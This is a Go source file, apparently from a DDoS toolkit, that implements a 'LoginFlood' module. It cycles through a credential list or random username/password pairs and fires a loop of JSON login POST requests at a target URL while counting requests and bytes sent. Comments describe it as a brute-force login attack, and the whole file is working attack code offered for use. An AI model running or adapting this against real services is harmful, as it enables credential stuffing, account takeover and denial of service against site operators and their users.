package layer7

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync/atomic"

	"github.com/go-ddos-tools/pkg/core"
	"github.com/go-ddos-tools/pkg/utils"
)

// LoginFlood implements brute-force/login attack
type LoginFlood struct {
	*BaseAttack
	credentialIndex uint64
}

func NewLoginFlood(cfg *core.AttackConfig) *LoginFlood {
	return &LoginFlood{
		BaseAttack: NewBaseAttack(cfg),
	}
}

func (l *LoginFlood) Attack(ctx context.Context) error {
	for range l.Config.RPC {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		// Get next credential (round-robin)
		var cred string
		if len(l.Config.Credentials) > 0 {
			idx := atomic.AddUint64(&l.credentialIndex, 1) - 1
			cred = l.Config.Credentials[idx%uint64(len(l.Config.Credentials))]
		} else {
			// Fallback if no credentials provided? Or just fake random
			cred = fmt.Sprintf("user%d:pass%d", utils.RandInt(0, 1000), utils.RandInt(0, 1000))
		}

		parts := strings.SplitN(cred, ":", 2)
		if len(parts) != 2 {
			continue
		}
		user, pass := parts[0], parts[1]

		// Construct payload (assuming JSON for now, can be improved to support form)
		// TODO: Make payload format configurable
		payload := fmt.Sprintf(`{"username": "%s", "password": "%s"}`, user, pass)

		req, err := http.NewRequest("POST", l.Config.Target, strings.NewReader(payload))
		if err != nil {
			continue
		}

		l.AddHeaders(req)
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("Content-Length", fmt.Sprintf("%d", len(payload)))

		resp, err := l.Client.Do(req)
		if err == nil {
			l.Config.RequestsSent.Add(1)
			l.Config.BytesSent.Add(int64(EstimateRequestSize(req) + len(payload)))
			// Basic success check: 200 OK often means login success in some APIs,
			// though many return 200 even on failure with {success: false}.
			// For stress testing, we just fire away.
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
		}
	}
	return nil
}
